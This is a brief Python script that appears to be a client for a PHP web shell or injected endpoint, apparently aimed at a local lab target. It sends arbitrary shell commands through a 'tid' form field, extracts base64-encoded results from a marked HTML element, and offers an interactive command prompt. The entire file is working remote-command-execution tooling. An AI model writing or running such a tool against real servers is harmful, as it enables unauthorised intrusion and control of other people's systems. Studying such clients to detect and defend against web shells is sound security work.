#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""")"""
import base64, re, sys, urllib.parse, urllib.request

_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8806/1.php"
ARG = sys.argv[2] if len(sys.argv) > 2 else None
MARKER = "q1-gate"


def fetch(data):
    req = urllib.request.Request(URL, data=data)
    return _opener.open(req, timeout=60).read()

def out(html):
    m = re.search((r'<div id="%s"[^>]*>([^<]*)<' % MARKER).encode(), html)
    if not m: sys.exit("容器未找到")
    return m.group(1)

def run_once(cmd):
    fields = {"tid": cmd}
    body = urllib.parse.urlencode(fields).encode()
    return base64.b64decode(out(fetch(body))).decode("utf-8", "replace")

if __name__ == "__main__":
    if ARG is not None:
        print(run_once(ARG))
    else:
        print("[交互模式] 输入命令, exit 退出")
        while True:
            try: line = input("cmd> ").strip()
            except (EOFError, KeyboardInterrupt): print(); break
            if not line: continue
            if line.lower() in ("exit","quit"): break
            try: print(run_once(line))
            except Exception as e: print("[!]", e)
